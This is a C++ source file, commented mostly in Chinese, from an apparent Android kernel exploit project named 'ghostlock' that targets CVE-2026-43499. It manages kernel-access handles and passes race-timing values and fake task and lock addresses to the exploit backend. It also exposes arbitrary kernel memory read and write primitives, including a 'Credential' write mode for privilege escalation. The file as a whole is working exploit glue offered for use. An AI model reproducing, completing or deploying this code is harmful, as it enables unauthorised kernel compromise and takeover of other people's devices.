/** @file device/43499/chain.cpp
 *  43499 的设备侧原语：只做「按 id 查表 + 调一个既有原语 + 回来」。
 *
 *  访问对象按 route 从工厂取（create_kernel_access_43499）—— route 取值来自档案，
 *  由 Kotlin 传进来；这里不做任何选择。
 */
#include <cstdint>
#include <span>
#include <vector>
#include <memory>

#include "backend/cve_2026_43499/access_factory_43499.hpp"
#include "device/43499/chain.hpp"
#include "support/gl_log.h"

namespace ghostlock::jni {
    namespace {
        /** 43499 的内核访问表：按不透明 id 持有（不可拷贝，放 unique_ptr）。 */
        constexpr std::size_t kMaxAccesses43499 = 4U;
        std::unique_ptr<contract::KernelAccess> g_accesses_43499[kMaxAccesses43499];


        /** 设备动作表的上下文（与 access 表并排）：表里的 land/read 要知道对哪个 access、哪条 route。 */
        Ops43499Context g_ops_ctx_43499{};
    }  // namespace

    Ops43499Context *current_ops_ctx_43499() noexcept {
        return &g_ops_ctx_43499;
    }

    namespace {
    }  // namespace

    std::uint64_t device_make_access_43499(const int route) noexcept {
        debug("43499: make_access route=%d", route);
        const auto named = static_cast<profile::RouteId>(route);
        std::unique_ptr<contract::KernelAccess> access =
            backend::cve_2026_43499::create_kernel_access_43499(named);
        if (access == nullptr) {
            return 0U;  /* route 未命名或未知：工厂给 null */
        }
        for (std::size_t index = 0U; index < kMaxAccesses43499; ++index) {
            if (g_accesses_43499[index] == nullptr) {
                g_accesses_43499[index] = std::move(access);
                /* 盖戳：之后表里的 land/read 就知道对哪个 access、哪条 route（值来自调用方 ✓）。 */
                g_ops_ctx_43499.access_id = static_cast<std::uint64_t>(index) + 1U;
                g_ops_ctx_43499.route = static_cast<std::uint64_t>(route);
                return static_cast<std::uint64_t>(index) + 1U;
            }
        }
        return 0U;  /* 表满 */
    }

    bool device_destroy_access_43499(const std::uint64_t accessId) noexcept {
        if (accessId == 0U) {
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
            return false;
        }
        g_accesses_43499[slot].reset();
        return true;
    }
    /**
     *  关掉一个 43499 的内核访问对象（会话收尾的第一步；退役树里 shutdown 先于 destroy）。
     *
     *  @return 0 成功；否则是 Access 的状态码（上层翻成具名）。
     */
    int device_shutdown_43499(const std::uint64_t accessId) noexcept {
        if (accessId == 0U) {
            return -1;  /* 没有句柄 */
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
            return -2;  /* 句柄失效 */
        }
        const auto down = g_accesses_43499[slot]->shutdown();
        return down.ok() ? 0 : static_cast<int>(down.status);
    }


    /** 原地填 43499 的访问参数（该类不可拷贝，所以只能填不能返回）。 */
    void fill_access_params_43499(backend::cve_2026_43499::Access43499Parameters &params,
                                  const std::uint64_t route, const std::uint64_t offset,
                                  const bool offset_set) noexcept {
        params.route = static_cast<profile::RouteId>(route);
        params.offset = offset;
        params.offset_set = offset_set;
    }

/** Fill params from the assembly (new path; the four-argument one stays). */
void fill_access_params_43499_full(backend::cve_2026_43499::Access43499Parameters &params,
                                 const std::uint64_t route, const std::uint64_t offset,
                                 const bool offset_set, const std::uint64_t *const assembly,
                                 const std::size_t count) noexcept {
    fill_access_params_43499(params, route, offset, offset_set);
    if (assembly == nullptr || count < 17U) {
        return;
    }
    params.stamp_waiter_offset = assembly[0];
    params.stamp_task_offset = assembly[1];
    params.stamp_lock_offset = assembly[2];
    params.stamp_buffer_size = assembly[3];
    params.max_attempts = static_cast<std::uint32_t>(assembly[4]);
    params.arm_hold = static_cast<std::uint32_t>(assembly[5]);
    params.arm_sequence = static_cast<std::uint32_t>(assembly[6]);
    params.park_ms = static_cast<std::uint32_t>(assembly[7]);
    params.settle_us = static_cast<std::uint32_t>(assembly[8]);
    params.consumer_delay_us = static_cast<std::uint32_t>(assembly[9]);
    params.burst_calls = static_cast<std::uint32_t>(assembly[10]);
    params.max_calls = static_cast<std::uint32_t>(assembly[11]);
    params.fallback_lock_us = static_cast<std::uint32_t>(assembly[12]);
    params.nice_modulus = static_cast<std::uint32_t>(assembly[13]);
    params.policy = static_cast<std::uint32_t>(assembly[14]);
    params.fake_task = assembly[15];
    params.fake_lock = assembly[16];
}

/** Initialize with the assembly (new; the old entry point is untouched). */
int device_initialize_43499_full(const std::uint64_t accessId, const std::uint64_t route,
                                 const std::uint64_t offset, const bool offset_set,
                                 const std::uint64_t *const assembly, const std::size_t count) noexcept {
    if (accessId == 0U) {
        return -1;
    }
    const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
    if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
        return -2;
    }
    backend::cve_2026_43499::Access43499Parameters params{};
    fill_access_params_43499_full(params, route, offset, offset_set, assembly, count);
    const auto up = g_accesses_43499[slot]->initialize(params);
    return up.ok() ? 0 : static_cast<int>(up.status);
}
    /** @return 0 成功；否则 Access 状态码（上层翻具名）。 */
    int device_initialize_43499(const std::uint64_t accessId, const std::uint64_t route,
                                const std::uint64_t offset, const bool offset_set) noexcept {
                                    debug("43499: initialize access=%llu route=%llu", static_cast<unsigned long long>(accessId), static_cast<unsigned long long>(route));
        if (accessId == 0U) {
            return -1;
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
            return -2;
        }
        backend::cve_2026_43499::Access43499Parameters params{};
        fill_access_params_43499(params, route, offset, offset_set);
        const auto up = g_accesses_43499[slot]->initialize(params);
        return up.ok() ? 0 : static_cast<int>(up.status);
    }

    /** 写一块（通道 PiWindow，43499 只支持它）。@return 成功 true；失败给具名 why。 */
    bool device_write_43499(const std::uint64_t accessId, const std::uint64_t route,
                           const std::uint64_t offset, const std::uint64_t address,
                           const std::vector<std::uint8_t> &block,
                           const std::int32_t mode, const bool preserve,
                           const char **why) noexcept {
                               debug("43499: write access=%llu route=%llu bytes=%zu", static_cast<unsigned long long>(accessId), static_cast<unsigned long long>(route), block.size());
        if (why != nullptr) {
            *why = nullptr;
        }
        if (accessId == 0U) {
            if (why != nullptr) { *why = "write:no-handle"; }
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
            if (why != nullptr) { *why = "write:stale-handle"; }
            return false;
        }
        backend::cve_2026_43499::Access43499Parameters params{};
        fill_access_params_43499(params, route, offset, true);
        params.write_mode = static_cast<backend::cve_2026_43499::memory::WriteMode>(mode);
        params.preserve_child = preserve;
        const auto out = g_accesses_43499[slot]->write(
            address,
            std::span<const std::byte>(reinterpret_cast<const std::byte *>(block.data()), block.size()),
            ghostlock::contract::AccessChannel::PiWindow, params);
        if (!out.ok() && why != nullptr) {
            *why = ghostlock::contract::KernelAccess::status_name(out.status);
        }
        return out.ok();
    }

    /** Legacy 写一块（无 form）：mode=Credential、preserve=true；K1/K2 零调用。 */
    bool device_write_43499(const std::uint64_t accessId, const std::uint64_t route,
                           const std::uint64_t offset, const std::uint64_t address,
                           const std::vector<std::uint8_t> &block, const char **why) noexcept {
        return device_write_43499(accessId, route, offset, address, block,
                                  static_cast<std::int32_t>(
                                      backend::cve_2026_43499::memory::WriteMode::Credential),
                                  true, why);
    }


    /**
     *  读一块（通道 PiWindow）。读回的字节由上层决定怎么用；失败给具名 why。
     *
     *  @param out    读到的字节（长度可能短于请求，由上层判断）。
     *  @return 成功 true；失败给 why（Access 状态名）。
     */
    bool device_read_43499(const std::uint64_t accessId, const std::uint64_t route,
                           const std::uint64_t offset, const std::uint64_t address,
                           const std::size_t bytes, std::vector<std::uint8_t> &out,
                           const char **why) noexcept {
                               debug("43499: read access=%llu route=%llu bytes=%zu", static_cast<unsigned long long>(accessId), static_cast<unsigned long long>(route), bytes);
        if (why != nullptr) {
            *why = nullptr;
        }
        out.clear();
        if (accessId == 0U) {
            if (why != nullptr) { *why = "read:no-handle"; }
            return false;
        }
        const std::size_t slot = static_cast<std::size_t>(accessId) - 1U;
        if (slot >= kMaxAccesses43499 || g_accesses_43499[slot] == nullptr) {
            if (why != nullptr) { *why = "read:stale-handle"; }
            return false;
        }
        backend::cve_2026_43499::Access43499Parameters params{};
        fill_access_params_43499(params, route, offset, true);
        const auto back = g_accesses_43499[slot]->read(
            address, bytes, ghostlock::contract::AccessChannel::PiWindow, params);
        if (!back.ok()) {
            if (why != nullptr) {
                *why = ghostlock::contract::KernelAccess::status_name(back.status);
            }
            return false;
        }
        out.reserve(back.value.size());
        for (const std::byte one : back.value) {
            out.push_back(std::to_integer<std::uint8_t>(one));
        }
        return true;
    }

}  // namespace ghostlock::jni
